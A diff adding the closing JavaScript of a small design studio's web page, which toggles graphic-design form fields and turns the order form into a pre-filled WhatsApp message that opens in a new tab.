+    const serviceSelect = document.getElementById('service');
+    const graphicFields = document.getElementById('graphic-design-fields');
+
+    if(serviceSelect) {
+      serviceSelect.addEventListener('change', function() {
+        if (this.value === 'Graphic Design') {
+          graphicFields.style.display = 'flex';
+        } else {
+          graphicFields.style.display = 'none';
+        }
+      });
+    }
+
+    // WHATSAPP ORDER FORM SCRIPT
+    document.getElementById('order-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const phoneNumber = "94740246367"; 
+
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email').value;
+      const service = document.getElementById('service').value;
+      const message = document.getElementById('message').value;
+
+      let whatsappText = `*NEW ORDER REQUEST - STUDIO'S ANX*%0A%0A` +
+                         `*Name:* ${encodeURIComponent(name)}%0A` +
+                         `*Email:* ${encodeURIComponent(email)}%0A` +
+                         `*Service Required:* ${encodeURIComponent(service)}%0A`;
+
+      if (service === 'Graphic Design') {
+        const thumbName = document.getElementById('thumbnail-name').value;
+        const colors = document.getElementById('color-theme').value;
+        
+        whatsappText += `*Thumbnail Name:* ${encodeURIComponent(thumbName)}%0A` +
+                        `*Preferred Colors:* ${encodeURIComponent(colors)}%0A`;
+      }
+
+      whatsappText += `*Details:* ${encodeURIComponent(message)}`;
+
+      const whatsappUrl = `https://wa.me/${phoneNumber}?text=${whatsappText}`;
+      window.open(whatsappUrl, '_blank');
+    });
+  </script>
+</body>
+</html>
